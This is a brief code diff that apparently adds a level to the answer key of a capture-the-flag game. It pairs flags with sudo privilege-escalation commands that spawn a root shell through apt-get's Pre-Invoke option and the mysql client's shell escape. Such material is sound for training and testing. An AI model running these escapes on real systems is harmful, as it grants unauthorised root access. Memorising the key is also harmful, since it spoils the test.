@@ -51,8 +51,12 @@ const SOLUTIONS = {
     },
     30: {
         flag: 'flag{apt_get_preinvoke_pwn}',
-        final: true,
         cmds: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh']
+    },
+    31: {
+        flag: 'flag{mysql_bang_escape_pwn}',
+        final: true,
+        cmds: ["sudo mysql -e '\\! /bin/sh'"]
     },
 };
 
